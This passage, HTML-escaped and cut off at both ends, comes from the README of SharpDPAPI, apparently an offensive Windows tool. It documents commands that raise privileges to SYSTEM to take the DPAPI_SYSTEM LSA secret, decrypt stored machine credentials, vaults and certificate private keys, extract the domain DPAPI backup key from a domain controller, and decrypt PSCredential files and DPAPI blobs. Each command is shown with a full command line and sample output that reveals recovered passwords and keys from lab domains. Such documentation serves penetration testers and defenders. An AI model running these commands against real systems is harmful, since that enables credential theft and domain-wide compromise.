KEY-----&#xA;MIIEowIBAAKCAQEAxVEW49fMt...(snip)...&#xA;-----END RSA PRIVATE KEY-----&#xA;-----BEGIN CERTIFICATE-----&#xA;MIIDKjCCAhKgAwIBAgIQYwhUr...(snip)...&#xA;-----END CERTIFICATE-----&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe certificates /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...(snip)...&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.10.0&#xA;&#xA;&#xA;[*] Action: Certificate Triage&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB51371...(snip)...&#xA;&#xA;&#xA;&#xA;Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104&#xA;&#xA;  File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0&#xA;&#xA;    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}&#xA;    Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}&#xA;    Description      : CryptoAPI Private Key&#xA;    algCrypt         : CALG_3DES (keyLen 192)&#xA;    algHash          : CALG_SHA (32772)&#xA;    Salt             : ef98458bca7135fe1bb89b3715180ae6&#xA;    HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85&#xA;    Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da&#xA;&#xA;    Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C&#xA;    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local&#xA;    Subject          : CN=harmj0y&#xA;    Valid Date       : 2/22/2021 2:19:02 PM&#xA;    Expiry Date      : 2/22/2022 2:19:02 PM&#xA;    Enhanced Key Usages:&#xA;        Client Authentication (1.3.6.1.5.5.7.3.2)&#xA;         [!] Certificate is used for client auth!&#xA;        Secure Email (1.3.6.1.5.5.7.3.4)&#xA;        Encrypting File System (1.3.6.1.4.1.311.10.3.4)&#xA;&#xA;    [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:&#xA;&#xA;-----BEGIN RSA PRIVATE KEY-----&#xA;MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...&#xA;-----END RSA PRIVATE KEY-----&#xA;-----BEGIN CERTIFICATE-----&#xA;MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...&#xA;-----END CERTIFICATE-----&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;triage&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;triage&lt;/strong&gt; command runs the user &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#credentials&#34;&gt;credentials&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#vaults&#34;&gt;vaults&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#rdg&#34;&gt;rdg&lt;/a&gt;, and &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#certificates&#34;&gt;certificates&lt;/a&gt; commands.&lt;/p&gt; &#xA;&lt;h3&gt;Machine Triage&lt;/h3&gt; &#xA;&lt;h4&gt;machinemasterkeys&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;machinemasterkeys&lt;/strong&gt; command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.&lt;/p&gt; &#xA;&lt;p&gt;Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe machinemasterkeys&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: Machine DPAPI Masterkey File Triage&#xA;&#xA;[*] Elevating to SYSTEM via token duplication for LSA secret retrieval&#xA;[*] RevertToSelf()&#xA;&#xA;[*] Secret  : DPAPI_SYSTEM&#xA;[*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;[*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;&#xA;&#xA;[*] SYSTEM master key cache:&#xA;&#xA;{1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C&#xA;...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;machinecredentials&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;machinecredentials&lt;/strong&gt; command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Credential files.&lt;/p&gt; &#xA;&lt;p&gt;Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe machinecredentials&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: Machine DPAPI Credential Triage&#xA;&#xA;[*] Elevating to SYSTEM via token duplication for LSA secret retrieval&#xA;[*] RevertToSelf()&#xA;&#xA;[*] Secret  : DPAPI_SYSTEM&#xA;[*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;[*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;&#xA;[*] SYSTEM master key cache:&#xA;&#xA;{1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C&#xA;...(snip)...&#xA;&#xA;&#xA;[*] Triaging System Credentials&#xA;&#xA;&#xA;Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials&#xA;&#xA;  CredFile           : C73A55F92FAE222C18A8989FEA28A1FE&#xA;&#xA;    guidMasterKey    : {1cb83cb5-96cd-445d-baac-49e97f4eeb72}&#xA;    size             : 544&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32782/26128&#xA;    description      : Local Credential Data&#xA;&#xA;    LastWritten      : 3/24/2019 7:08:43 PM&#xA;    TargetName       : Domain:batch=TaskScheduler:Task:{B745BF75-D62D-4B1C-84ED-F0437214ECED}&#xA;    TargetAlias      :&#xA;    Comment          :&#xA;    UserName         : TESTLAB\harmj0y&#xA;    Credential       : Password123!&#xA;&#xA;&#xA;Folder       : C:\WINDOWS\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials&#xA;&#xA;  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D&#xA;&#xA;    ...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;machinevaults&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;machinevaults&lt;/strong&gt; command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Vaults.&lt;/p&gt; &#xA;&lt;p&gt;Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe machinevaults&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: Machine DPAPI Vault Triage&#xA;&#xA;[*] Elevating to SYSTEM via token duplication for LSA secret retrieval&#xA;[*] RevertToSelf()&#xA;&#xA;[*] Secret  : DPAPI_SYSTEM&#xA;[*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;[*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;&#xA;[*] SYSTEM master key cache:&#xA;&#xA;{1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C&#xA;...(snip)...&#xA;&#xA;&#xA;[*] Triaging SYSTEM Vaults&#xA;&#xA;&#xA;[*] Triaging Vault folder: C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28&#xA;&#xA;  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28&#xA;  Name               : Web Credentials&#xA;    guidMasterKey    : {0bd732d9-c396-4f9a-a69a-508632c05235}&#xA;    size             : 324&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32782/26128&#xA;    description      :&#xA;    aes128 key       : 74CE3D7BCC4D0C4734931041F6D00D09&#xA;    aes256 key       : B497F57730A2F29C3533B76BD6B33EEA231C1F51ED933E0CA1210B9E3A16D081&#xA;&#xA;...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;certificates /machine&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;certificates /machine&lt;/strong&gt; command will use the machine certificate store to look for decryptable machine certificate private keys. &lt;code&gt;/mkfile:X&lt;/code&gt; and &lt;code&gt;{GUID}:masterkey&lt;/code&gt; are usable with the &lt;code&gt;/target:\[file|folder\]&lt;/code&gt; command, otherwise SharpDPAPI will elevate to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine system encrypted DPAPI private certificate keys.&lt;/p&gt; &#xA;&lt;p&gt;By default, only private keys linkable to an associated installed certificate are displayed. The &lt;code&gt;/showall&lt;/code&gt; command will display ALL decrypted private keys.&lt;/p&gt; &#xA;&lt;p&gt;Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe certificates /machine&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.10.0&#xA;&#xA;&#xA;[*] Action: Certificate Triage&#xA;[*] Elevating to SYSTEM via token duplication for LSA secret retrieval&#xA;[*] RevertToSelf()&#xA;&#xA;[*] Secret  : DPAPI_SYSTEM&#xA;[*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;[*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3&#xA;&#xA;&#xA;[*] SYSTEM master key cache:&#xA;&#xA;{f12f57e1-dd41-4daa-88f1-37a64034c7e9}:3AEB121ECF2...(snip)...&#xA;&#xA;&#xA;[*] Triaging System Certificates&#xA;&#xA;&#xA;Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&#xA;&#xA;  File               : 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0&#xA;&#xA;    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}&#xA;    Master Key GUID  : {f12f57e1-dd41-4daa-88f1-37a64034c7e9}&#xA;    Description      : CryptoAPI Private Key&#xA;    algCrypt         : CALG_3DES (keyLen 192)&#xA;    algHash          : CALG_SHA (32772)&#xA;    Salt             : aa8c9e4849455660fc5fc96589f3e40e&#xA;    HMAC             : 9138559ef30fbd70808dca2c1ed02a29&#xA;    Unique Name      : te-Machine-50500b00-fddb-4a0d-8aa6-d73404473650&#xA;&#xA;    Thumbprint       : A82ED8207DF6BC16BB65BF6A91E582263E217A4A&#xA;    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local&#xA;    Subject          : CN=dev.theshire.local&#xA;    Valid Date       : 2/22/2021 3:50:43 PM&#xA;    Expiry Date      : 2/22/2022 3:50:43 PM&#xA;    Enhanced Key Usages:&#xA;        Client Authentication (1.3.6.1.5.5.7.3.2)&#xA;         [!] Certificate is used for client auth!&#xA;        Server Authentication (1.3.6.1.5.5.7.3.1)&#xA;&#xA;    [*] Private key file 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:&#xA;&#xA;-----BEGIN RSA PRIVATE KEY-----&#xA;MIIEpAIBAAKCAQEAzRX2ipgM1t9Et4KoP...(snip)...&#xA;-----END RSA PRIVATE KEY-----&#xA;-----BEGIN CERTIFICATE-----&#xA;MIIFOjCCBCKgAwIBAgITVQAAAJqDK8j15...(snip)...&#xA;-----END CERTIFICATE-----&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;machinetriage&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;machinetriage&lt;/strong&gt; command runs the user &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machinecredentials&#34;&gt;machinecredentials&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machinevaults&#34;&gt;machinevaults&lt;/a&gt;, and &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#certificates--machine&#34;&gt;certificates /machine&lt;/a&gt; commands.&lt;/p&gt; &#xA;&lt;h3&gt;Misc&lt;/h3&gt; &#xA;&lt;h4&gt;ps&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;ps&lt;/strong&gt; command will describe/decrypt an exported PSCredential clixml. A &lt;code&gt;/target:FILE.xml&lt;/code&gt; &lt;em&gt;must&lt;/em&gt; be supplied.&lt;/p&gt; &#xA;&lt;p&gt;The command will a) decrypt the file with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/unprotect&lt;/code&gt; flag will use CryptUnprotectData() to decrypt the credenial .xml without masterkeys needed, &lt;em&gt;if&lt;/em&gt; the command is run from the user context who saved the passwords. This can be done from an &lt;em&gt;unprivileged&lt;/em&gt; context, without the need to touch LSASS. For why this approach isn&#39;t used for credentials/vaults, see Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Decrypt an exported credential .xml using CryptProtectData() (the &lt;code&gt;/unprotect&lt;/code&gt; flag):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Temp&amp;gt; $SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force&#xA;PS C:\Temp&amp;gt; New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\user&#39;, $SecPassword) | Export-CLIXml C:\Temp\cred.xml&#xA;PS C:\Temp&amp;gt; .\SharpDPAPI.exe ps /target:C:\Temp\cred.xml /unprotect&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.5.0&#xA;&#xA;&#xA;[*] Action: Describe PSCredential .xml&#xA;&#xA;    CredFile         : C:\Temp\cred.xml&#xA;    Accessed         : 7/25/2019 11:53:09 AM&#xA;    Modified         : 7/25/2019 11:53:09 AM&#xA;    User Name        : TESTLAB\user&#xA;    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}&#xA;    size             : 170&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    Password         : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using domain {GUID}:SHA1 masterkey mappings:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Temp&amp;gt; $SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force&#xA;PS C:\Temp&amp;gt; New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\user&#39;, $SecPassword) | Export-CLIXml C:\Temp\cred.xml&#xA;PS C:\Temp&amp;gt; .\SharpDPAPI.exe ps /target:C:\Temp\cred.xml &#34;{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3&#34;&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.5.0&#xA;&#xA;&#xA;[*] Action: Describe PSCredential .xml&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3&#xA;&#xA;    CredFile         : C:\Temp\cred.xml&#xA;    Accessed         : 7/25/2019 12:04:12 PM&#xA;    Modified         : 7/25/2019 12:04:12 PM&#xA;    User Name        : TESTLAB\user&#xA;    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}&#xA;    size             : 170&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    Password         : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Temp&amp;gt; $SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force&#xA;PS C:\Temp&amp;gt; New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\user&#39;, $SecPassword) | Export-CLIXml C:\Temp\cred.xml&#xA;PS C:\Temp&amp;gt; .\SharpDPAPI.exe ps /target:C:\Temp\cred.xml /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.5.0&#xA;&#xA;&#xA;[*] Action: Describe PSCredential .xml&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3&#xA;&#xA;    CredFile         : C:\Temp\cred.xml&#xA;    Accessed         : 7/25/2019 12:04:12 PM&#xA;    Modified         : 7/25/2019 12:04:12 PM&#xA;    User Name        : TESTLAB\user&#xA;    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}&#xA;    size             : 170&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    Password         : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;blob&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;blob&lt;/strong&gt; command will describe/decrypt a DPAPI blob. A &lt;code&gt;/target:&amp;lt;BASE64|blob.bin&amp;gt;&lt;/code&gt; &lt;em&gt;must&lt;/em&gt; be supplied.&lt;/p&gt; &#xA;&lt;p&gt;The command will a) decrypt the blob with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/unprotect&lt;/code&gt; flag will use CryptUnprotectData() to decrypt the blob without masterkeys needed, &lt;em&gt;if&lt;/em&gt; the command is run from the user context who saved the passwords. This can be done from an &lt;em&gt;unprivileged&lt;/em&gt; context, without the need to touch LSASS. For why this approach isn&#39;t used for credentials/vaults, see Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Decrypt a blob using CryptProtectData() (the &lt;code&gt;/unprotect&lt;/code&gt; flag):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe blob /target:C:\Temp\blob.bin /unprotect&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.5.0&#xA;&#xA;&#xA;[*] Action: Describe DPAPI blob&#xA;&#xA;[*] Using CryptUnprotectData() for decryption.&#xA;&#xA;    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}&#xA;    size             : 170&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    dec(blob)        : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using domain {GUID}:SHA1 masterkey mappings:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe blob /target:C:\Temp\blob2.bin {0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.5.0&#xA;&#xA;&#xA;[*] Action: Describe DPAPI blob&#xA;&#xA;[*] Using CryptUnprotectData() for decryption.&#xA;&#xA;    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}&#xA;    size             : 314&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    dec(blob)        : 01 00 00 00 3F 3F 3F 3F 01 15 3F 11 3F 7A 00 3F 4F 3F 3F ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe blob /target:C:\Temp\blob2.bin /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.5.0&#xA;&#xA;&#xA;[*] Action: Describe DPAPI blob&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3&#xA;&#xA;    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}&#xA;    size             : 314&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    dec(blob)        : 01 00 00 00 3F 3F 3F 3F 01 15 3F 11 3F 7A 00 3F 4F 3F 3F ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;backupkey&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;backupkey&lt;/strong&gt; command will retrieve the domain DPAPI backup key from a domain controller using the &lt;strong&gt;LsaRetrievePrivateData&lt;/strong&gt; API approach &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/raw/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927&#34;&gt;from Mimikatz&lt;/a&gt;. This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)&lt;/p&gt; &#xA;&lt;p&gt;Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/nowrap&lt;/code&gt; flag will prevent wrapping the base64 key on display.&lt;/p&gt; &#xA;&lt;p&gt;This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz&#39; &lt;strong&gt;dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk&lt;/strong&gt; module, or used in blob/file /pvk:X form with the &lt;strong&gt;masterkeys&lt;/strong&gt;, &lt;strong&gt;credentials&lt;/strong&gt;, or &lt;strong&gt;vault&lt;/strong&gt; SharpDPAPI commands.&lt;/p&gt; &#xA;&lt;p&gt;By default, SharpDPAPI will try to determine the current domain controller via the &lt;strong&gt;DsGetDcName&lt;/strong&gt; API call. A server can be specified with &lt;code&gt;/server:COMPUTER.domain.com&lt;/code&gt;. If you want the key saved to disk instead of output as a base64 blob, use &lt;code&gt;/file:key.pvk&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Retrieve the DPAPI backup key for the current domain controller:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe backupkey&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: Retrieve domain DPAPI backup key&#xA;&#xA;&#xA;[*] Using current domain controller  : PRIMARY.testlab.local&#xA;[*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8&#xA;[*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8&#xA;[*] Key :&#xA;          HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAA...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Retrieve the DPAPI backup key for the specified DC, outputting the backup key to a file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: Retrieve domain DPAPI backup key&#xA;&#xA;&#xA;[*] Using server                     : primary.testlab.local&#xA;[*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8&#xA;[*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8&#xA;[*] Backup key written to            : key.pvk&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;search&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;search&lt;/strong&gt; command will search for potential DPAPI blobs in the registry, files, folders, and base64 blobs. Usage:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SharpDPAPI.exe search /type:registry 